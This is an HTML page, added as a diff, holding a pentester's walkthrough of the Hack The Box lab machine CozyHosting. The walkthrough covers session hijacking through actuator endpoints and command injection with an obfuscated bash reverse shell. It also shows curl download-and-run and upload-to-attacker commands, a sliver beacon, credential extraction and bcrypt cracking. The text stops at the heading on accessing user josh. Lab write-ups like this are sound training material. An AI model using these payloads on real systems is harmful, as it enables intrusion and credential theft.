@@ -1,0 +1,521 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script>document.documentElement.classList.add("js");(function(){function a(k){var o=[];try{var p=String(window.name||"").split(";");for(var i=0;i<p.length;i++){var q=p[i].split("=");if(q[0]===k&&q[1])o.push(q[1])}}catch(e){}try{var m=document.cookie.match(new RegExp("(?:^|; )"+k+"=([^;]*)"));if(m)o.push(decodeURIComponent(m[1]))}catch(e){}try{var v=localStorage.getItem(k);if(v!==null&&typeof v!=="undefined")o.push(v)}catch(e){}return o}function g(k){var v=a(k);return v.length?v[0]:null}function p(){var b=null;a("fg-prefs").forEach(function(r){var x=String(r).split(".");if(x.length!==3)return;var t=parseInt(x[0],36);if(!isFinite(t)||t<=0)return;var th=x[1]==="light"||x[1]==="dark"?x[1]:null;var rl=x[2]==="c"||x[2]==="o"?x[2]:null;if(th||rl){if(!b||t>b.t)b={t:t,th:th,rl:rl}}});if(b)return b;var th=g("fg-theme"),rl=g("fg-spine-v2");if(th==="light"||th==="dark"||rl==="c"||rl==="o")return{t:0,th:th==="light"||th==="dark"?th:null,rl:rl==="c"||rl==="o"?rl:null};return null}try{var s=p();var th=s&&s.th?s.th:(matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light");document.documentElement.setAttribute("data-theme",th);if(s&&s.rl==="c")document.documentElement.classList.add("nav-collapsed")}catch(e){document.documentElement.setAttribute("data-theme","dark")}})();</script>
+    <link rel="icon" type="image/svg+xml" href="../favicon.svg">
+    <link rel="alternate icon" type="image/x-icon" href="../assets/images/favicon.ico">
+    <link rel="stylesheet" href="../assets/css/reset.css?v=8">
+    <link rel="stylesheet" href="../assets/css/site.css?v=176">
+    <title>Frédéric Goossens | CozyHosting</title>
+</head>
+<body>
+    <a class="skip" href="#main">Skip to content</a>
+
+    <header class="spine">
+        <div class="spine-id">
+            <a class="si-id" href="../index.html" aria-label="Frédéric Goossens - Home">
+                <span class="si-photo"><img src="../assets/images/pfp.jpg" alt="Frédéric Goossens"></span>
+                <span class="si-prompt"><span class="sigil">$</span>whoami</span>
+                <span class="si-name">Frédéric Goossens</span>
+                <span class="si-roles"><span>Pentester</span><span>OSCP · BSCP</span></span>
+            </a>
+            <div class="si-socials">
+                <a class="slink" href="https://github.com/fredericgoossens" target="_blank" rel="noopener noreferrer" aria-label="GitHub"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg></a>
+                <a class="slink" href="https://www.linkedin.com/in/fr%C3%A9d%C3%A9ric-goossens-0344b1241/" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg></a>
+            </div>
+        </div>
+        <nav aria-label="Primary">
+            <ul>
+                <li><a href="../index.html"><span class="n">01</span><span class="l">Home</span></a></li>
+                <li><a href="../resume.html"><span class="n">02</span><span class="l">Resume</span></a></li>
+                <li><a href="../writing.html"><span class="n">03</span><span class="l">Writing</span></a></li>
+                <li><a href="../htb.html"><span class="n">04</span><span class="l">HackTheBox</span></a></li>
+            </ul>
+        </nav>
+        <div class="spine-foot">
+            <button class="theme-btn" type="button" data-theme-toggle aria-label="Toggle color theme" aria-pressed="false"><svg class="i-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg><svg class="i-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"/></svg></button>
+            <button class="spine-toggle" type="button" data-spine-toggle aria-expanded="true" aria-label="Collapse navigation"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M15 18l-6-6 6-6"/></svg></button>
+        </div>
+    </header>
+
+    <div class="topbar">
+        <a class="topbar-id" href="../index.html" aria-label="Frédéric Goossens - Home"><img src="../assets/images/pfp.jpg" alt="Frédéric Goossens"></a>
+        <div class="tb-actions">
+            <button class="theme-btn" type="button" data-theme-toggle aria-label="Toggle color theme" aria-pressed="false"><svg class="i-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg><svg class="i-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"/></svg></button>
+            <button class="menu-btn" type="button" data-menu-open aria-label="Open menu" aria-controls="menu" aria-haspopup="dialog" aria-expanded="false">
+                <span></span><span></span><span></span>
+            </button>
+        </div>
+    </div>
+
+    <div id="menu" role="dialog" aria-modal="true" aria-label="Navigation menu" aria-hidden="true" inert>
+        <div class="menu-top">
+            <a class="mi-id" href="../index.html" aria-label="Frédéric Goossens - Home"><img src="../assets/images/pfp.jpg" alt=""><span>Frédéric Goossens</span></a>
+            <button class="close-btn" type="button" data-menu-close>Close ×</button>
+        </div>
+        <nav aria-label="Mobile">
+            <ul>
+                <li><a href="../index.html"><span class="n">01</span>Home</a></li>
+                <li><a href="../resume.html"><span class="n">02</span>Resume</a></li>
+                <li><a href="../writing.html"><span class="n">03</span>Writing</a></li>
+                <li><a href="../htb.html"><span class="n">04</span>HackTheBox</a></li>
+            </ul>
+        </nav>
+        <div class="menu-foot">
+            <a class="slink" href="https://github.com/fredericgoossens" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg><span>GitHub</span></a>
+            <a class="slink" href="https://www.linkedin.com/in/fr%C3%A9d%C3%A9ric-goossens-0344b1241/" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg><span>LinkedIn</span></a>
+        </div>
+    </div>
+
+    <div class="progress"></div>
+
+    <div class="shell">
+        <main class="wrap" id="main">
+            <div class="post-wrap">
+                <article class="post" data-cover="../assets/images/htb/cozyhosting/logo.png">
+                    <a class="crumb" href="../htbList.html?os=Linux">← All Linux write-ups</a>
+                    <h1 data-type="CozyHosting" data-prefix="# "></h1>
+
+                    <div class="info">
+                        <div class="meta-item">
+                            <span class="meta-k">
+                                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3l7 3v5c0 4.6-3 8.2-7 10-4-1.8-7-5.4-7-10V6l7-3z"/></svg>
+                                Platform
+                            </span>
+                            <span class="meta-v">Hack The Box</span>
+                        </div>
+                        <div class="meta-item">
+                            <span class="meta-k">
+                                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" aria-hidden="true"><path d="M5 20v-4M11 20V10M17 20V4"/></svg>
+                                Difficulty
+                            </span>
+                            <span class="meta-v" data-diff="Easy">Easy</span>
+                        </div>
+                        <div class="meta-item">
+                            <span class="meta-k">
+                                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/></svg>
+                                Read time
+                            </span>
+                            <span class="meta-v" data-read-time-auto=""></span>
+                        </div>
+                        <div class="meta-item">
+                            <span class="meta-k">
+                                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" aria-hidden="true"><path d="M4 20l4-1L20 7l-3-3L5 16l-1 4z"/></svg>
+                                Author
+                            </span>
+                            <span class="meta-v">Frédéric Goossens</span>
+                        </div>
+                    </div>
+
+                    <blockquote>30 points available</blockquote>
+
+<h2>Discovery</h2>
+
+<details>
+<summary>Nmap</summary>
+<div class="inner">
+<p><code>sudo nmap -A -sV -sT -v -O -T4 -p0- 10.10.11.230</code></p><pre><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 4356bca7f2ec46ddc10f83304c2caaa8 (ECDSA)
+|_  256 6f7a6c3fa68de27595d47b71ac4f7e42 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://cozyhosting.htb
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: nginx/1.18.0 (Ubuntu)</code></pre><ul><li>Add cozyhosting.htb to /etc/hosts to enter site</li></ul>
+</div>
+</details>
+
+<details>
+<summary>Fuzzing</summary>
+<div class="inner">
+<p><code>wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/megabeast.txt --hc 404 http://cozyhosting.htb/FUZZ</code></p><pre><code>000000567:   200        0 L      1 W        634 Ch      "actuator"
+000000721:   401        0 L      1 W        97 Ch       "admin"
+000015208:   500        0 L      1 W        73 Ch       "error"
+000021422:   200        284 L    745 W      12706 Ch    "index"
+000024650:   200        96 L     196 W      4431 Ch     "login"
+000001629:   204        0 L      0 W        0 Ch        "logout"</code></pre><ul><li>http://cozyhosting.htb/actuator/mappings<ul><li>contains endpoints</li><li>some interesting ones:<ul><li><code>POST /executessh</code> → RCE?</li><li><code>GET /actuator/sessions</code> → usernames? / Session takeover?<pre><code>8A96F9F79F202437379AFDEE261F260A	"kanderson"
+DD8AE41AE2AA4917CC2A31ACEF4BB37E	"kanderson"
+0BF94BB8AE0693F03AF49FAB69B4A0AB	"UNAUTHORIZED"
+C924792FEFBA13AA901D71B2C973EEBF	"UNAUTHORIZED"
+16B0787DA2E9B5E0F365111FC4DDA48C	"UNAUTHORIZED"
+C58F4460E1369D2A07764589EE451D47	"UNAUTHORIZED"</code></pre></li></ul></li></ul><figure><img src="../assets/images/htb/cozyhosting/01-untitled.png" alt=""></figure></li></ul>
+</div>
+</details>
+
+<details>
+<summary>nikto</summary>
+<div class="inner">
+<pre><code>The anti-clickjacking X-Frame-Options header is not present
+The X-Content-Type-Options header is not set
+nginx/1.18.0 appears to be outdated (current is at least 1.20.1).</code></pre>
+</div>
+</details>
+
+<details>
+<summary>interesting requests</summary>
+<div class="inner">
+<pre><code>GET / HTTP/1.1
+Host: cozyhosting.htb
+User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: close
+Cookie: JSESSIONID=36B677CC1A8EF49A58B9C6E144D3AF0A
+Upgrade-Insecure-Requests: 1</code></pre><p>→ cookie has session id from <code>/actuator/sessions</code> endpoint?</p><pre><code>POST /login HTTP/1.1
+Host: cozyhosting.htb
+User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 21
+Origin: http://cozyhosting.htb
+Connection: close
+Referer: http://cozyhosting.htb/login
+Cookie: JSESSIONID=36B677CC1A8EF49A58B9C6E144D3AF0A
+Upgrade-Insecure-Requests: 1
+
+username=a&amp;password=a</code></pre>
+</div>
+</details>
+
+<h3>Hijacking session</h3>
+
+<p><a href="http://cozyhosting.htb/actuator/sessions">http://cozyhosting.htb/actuator/sessions</a> → active session id’s are regulary updated</p>
+
+<details>
+<summary>requests</summary>
+<div class="inner">
+<figure><img src="../assets/images/htb/cozyhosting/02-untitled-1.png" alt=""></figure><pre><code>POST /login HTTP/1.1
+Host: cozyhosting.htb
+User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 27
+Origin: http://cozyhosting.htb
+Connection: close
+Referer: http://cozyhosting.htb/login?error
+Cookie: JSESSIONID=D12F27AF7A34C5CAA2788F8A2DD36917
+Upgrade-Insecure-Requests: 1
+
+username=test&amp;password=test</code></pre><pre><code>GET /login?error HTTP/1.1
+Host: cozyhosting.htb
+User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://cozyhosting.htb/login?error
+Connection: close
+Cookie: JSESSIONID=D12F27AF7A34C5CAA2788F8A2DD36917
+Upgrade-Insecure-Requests: 1</code></pre><pre><code>GET /admin HTTP/1.1
+Host: cozyhosting.htb
+User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://cozyhosting.htb/login?error
+Connection: close
+Cookie: JSESSIONID=D12F27AF7A34C5CAA2788F8A2DD36917
+Upgrade-Insecure-Requests: 1</code></pre><p>→ replaced KSESSION ID’s 3 times in a row using just intercept</p><p>→ or just go to the <code>/admin</code> endpoint directly</p>
+</div>
+</details>
+
+<figure><img src="../assets/images/htb/cozyhosting/03-untitled-2.png" alt=""></figure>
+
+
+
+<h3>SSH command execution using headers</h3>
+
+<p>When not providing a username we can see the ssh command is being executed:</p>
+
+<details>
+<summary>request</summary>
+<div class="inner">
+<pre><code>POST /executessh HTTP/1.1
+Host: cozyhosting.htb
+User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 27
+Origin: http://cozyhosting.htb
+Connection: close
+Referer: http://cozyhosting.htb/admin?error=Username%20can%27t%20contain%20whitespaces!
+Cookie: JSESSIONID=24A29B783B66729848726634B57591E5
+Upgrade-Insecure-Requests: 1
+
+host=10.10.11.230&amp;username=</code></pre>
+</div>
+</details>
+
+<details>
+<summary>response</summary>
+<div class="inner">
+<pre><code>HTTP/1.1 302
+Server: nginx/1.18.0 (Ubuntu)
+Date: Wed, 27 Sep 2023 13:46:54 GMT
+Content-Length: 0
+Location: http://cozyhosting.htb/admin?error=usage: ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface]           [-b bind_address] [-c cipher_spec] [-D [bind_address:]port]           [-E log_file] [-e escape_char] [-F configfile] [-I pkcs11]           [-i identity_file] [-J [user@]host[:port]] [-L address]           [-l login_name] [-m mac_spec] [-O ctl_cmd] [-o option] [-p port]           [-Q query_option] [-R address] [-S ctl_path] [-W host:port]           [-w local_tun[:remote_tun]] destination [command [argument ...]]
+Connection: close
+X-Content-Type-Options: nosniff
+X-XSS-Protection: 0
+Cache-Control: no-cache, no-store, max-age=0, must-revalidate
+Pragma: no-cache
+Expires: 0
+X-Frame-Options: DENY</code></pre>
+</div>
+</details>
+
+<ul><li>we are dealing with a bash environment</li><li>we could try manipulating the username= option to make it execute something else</li></ul>
+
+<figure><p><a href="https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions" target="_blank" rel="noopener noreferrer">Bypass Linux Restrictions</a></p></figure>
+
+<ol><li>testing how we can escape the ssh command<pre><code>ssh ;cat test;@10.10.11.230</code></pre><blockquote>using <code>‘;’</code> in Linux seems to work</blockquote></li><li>Creating payload using the hacktricks source
+
+<pre><code>echo "echo $(echo 'bash -i &gt;&amp; /dev/tcp/10.10.14.38/8081 0&gt;&amp;1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
+echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0ek9DODRNRGd4SURBK0pqRUsK|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h</code></pre>
+
+</li><li>Try establishing reverse shell</li></ol>
+
+<pre><code>nc -nvlp 8081</code></pre>
+
+<pre><code>POST /executessh HTTP/1.1
+Host: cozyhosting.htb
+User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 167
+Origin: http://cozyhosting.htb
+Connection: close
+Referer: http://cozyhosting.htb/admin?error=Username%20can%27t%20contain%20whitespaces!
+Cookie: JSESSIONID=24A29B783B66729848726634B57591E5
+Upgrade-Insecure-Requests: 1
+
+host=127.0.0.1&amp;username=;echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0ek9DODRNRGd4SURBK0pqRUsK|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h;</code></pre>
+
+<figure><img src="../assets/images/htb/cozyhosting/04-untitled-3.png" alt=""></figure>
+
+<h3>priv escalation</h3>
+
+<figure><p><a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" target="_blank" rel="noopener noreferrer">Linux Privilege Escalation</a></p></figure>
+
+<blockquote>the current user has no permissions to write or access any user folders</blockquote>
+
+<ol><li>Enumerating simple stuff<ol><li>env vars<pre><code>app@cozyhosting:/$ (env || set) 2&gt;/dev/null
+
+SHELL=/bin/sh
+PWD=/
+LOGNAME=app
+SYSTEMD_EXEC_PID=1059
+HOME=/home/app
+LANG=en_US.UTF-8
+INVOCATION_ID=faedfedb240e44548f41dd963632fc43
+USER=app
+SHLVL=2
+JOURNAL_STREAM=8:21340
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+_=/usr/bin/env
+OLDPWD=/usr</code></pre></li>
+<li>kernel version<pre><code>app@cozyhosting:/$ cat /proc/version
+Linux version 5.15.0-82-generic (buildd@lcy02-amd64-027) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #91-Ubuntu SMP Mon Aug 14 14:14:14 UTC 2023
+
+app@cozyhosting:/$ uname -a
+Linux cozyhosting 5.15.0-82-generic #91-Ubuntu SMP Mon Aug 14 14:14:14 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</code></pre></li></ol></li>
+<li>Looking for a folder with write permissions so we can get a better shell with sliver / upload binaries<p><code>find . -type d -exec test -w {} \; -print</code> → the /tmp directory works 🙂</p></li>
+<li>Run linpeas<pre><code>curl http://10.10.14.38:88/linpeas_linux_amd64 -o lp
+chmod +x lp
+./lp -a &gt; linpeas_output.txt
+curl -F "file=@linpeas_output.txt" http://10.10.14.38:88</code></pre><details>
+<summary>Interesting output</summary>
+<div class="inner">
+<pre><code># exploits
+[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)
+
+   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
+https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
+   Exposure: probable
+   Tags: [ ubuntu=(22.04) ]{kernel:5.15.0-27-generic}
+   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
+   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)
+
+[+] [CVE-2022-2586] nft_object UAF
+
+   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
+   Exposure: less probable
+   Tags: ubuntu=(20.04){kernel:5.12.13}
+   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
+   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)
+
+[+] [CVE-2022-0847] DirtyPipe
+
+   Details: https://dirtypipe.cm4all.com/
+   Exposure: less probable
+   Tags: ubuntu=(20.04|21.04),debian=11
+   Download URL: https://haxx.in/files/dirtypipez.c
+
+[+] [CVE-2021-4034] PwnKit
+
+   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
+   Exposure: less probable
+   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,debian=7|8|9|10|11,fedora,manjaro
+   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
+
+[+] [CVE-2021-3156] sudo Baron Samedit
+
+   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
+   Exposure: less probable
+   Tags: mint=19,ubuntu=18|20, debian=10
+   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main
+
+[+] [CVE-2021-3156] sudo Baron Samedit 2
+
+   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
+   Exposure: less probable
+   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
+   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
+
+[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
+
+   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
+   Exposure: less probable
+   Tags: ubuntu=20.04{kernel:5.8.0-*}
+   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
+   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
+   Comments: ip_tables kernel module must be loaded
+
+[+] [CVE-2017-5618] setuid screen v4.5.0 LPE
+
+   Details: https://seclists.org/oss-sec/2017/q1/184
+   Exposure: less probable
+   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154
+
+# PPID https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
+Proc 1071 with ppid 1 is run by user app but the ppid user is root
+app    1071  6.9  8.1 3635608 325760 ?  Ssl  15:38   2:30 /usr/bin/java -jar cloudhosting-0.0.1.jar
+
+# Processes with credentials in memory (root req)
+https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory
+sshd: process found (dump creds from memory as root)
+
+# cron
+https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs
+SHELL=/bin/sh
+
+17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
+
+# ssh config
+/usr/share/openssh/sshd_config</code></pre>
+</div>
+</details></li>
+<li>(Optional) Trying sliver payload<pre><code>generate beacon -b http://10.10.14.38:80 --os Linux
+curl http://10.10.14.38:88/SUBTLE_HONEY -o oioi
+chmod +x oioi
+./oioi</code></pre><p>→ works, but not rlly useful</p></li>
+<li>(Optional) Get a more stable shell<pre><code>python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+CTRL+Z
+
+stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;</code></pre></li></ol>
+
+<h3>Jar file</h3>
+
+<p>https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes</p>
+
+<p>I think this is the most interesting so far:</p>
+
+<blockquote>Proc 1071 with ppid 1 is run by user app but the ppid user is root</blockquote>
+
+<pre><code>app  1071  6.9  8.1 3635608 325760 ?  Ssl  15:38   2:30 /usr/bin/java -jar cloudhosting-0.0.1.jar
+
+curl -F "file=@cloudhosting-0.0.1.jar" http://10.10.14.38:88</code></pre>
+
+<p>→ open in jadx</p>
+
+<ul><li>Found in htb.cloudhosting &gt; Scheduled &gt; FakeUser<ul><li><code>kanderson:MRdEQuv6~6P9</code></li></ul></li><li>Found in resources &gt; BOOT-INF &gt; Classes &gt; application.properties<ul><li><code>jdbc:postgresql://localhost:5432/cozyhosting</code></li><li><code>postgres:Vg&amp;nvzAQ7XxR</code></li></ul></li></ul>
+
+<h4>Postgres db access</h4>
+
+<figure><p><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql" target="_blank" rel="noopener noreferrer">5432,5433 - Pentesting Postgresql</a></p></figure>
+
+<pre><code>app@cozyhosting:/tmp$ psql -h localhost -U postgres cozyhosting</code></pre>
+
+<pre><code>\c cozyhosting
+
+SELECT table_name
+FROM information_schema.tables
+WHERE table_schema = 'public';
+table_name
+------------
+ users
+ hosts
+(2 rows)
+
+SELECT * FROM public.users;
+   name    |                           password                           | role
+-----------+--------------------------------------------------------------+-------
+ kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
+ admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin</code></pre>
+
+<h4>Crack admin bcrypt hash</h4>
+
+<blockquote>Asked chatGPT what the hash was → Bcrypt. And decrypted it with hashcat</blockquote>
+
+<pre><code>hashcat -a 0 -m 3200 '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm' /usr/share/wordlists/rockyou.txt -w 4 -O</code></pre>
+
+<p>→ admin:<mark class="highlight-red" data-notion-highlight="red"><strong>manchesterunited</strong></mark></p>
+
+<h4>Access as user josh</h4>
+
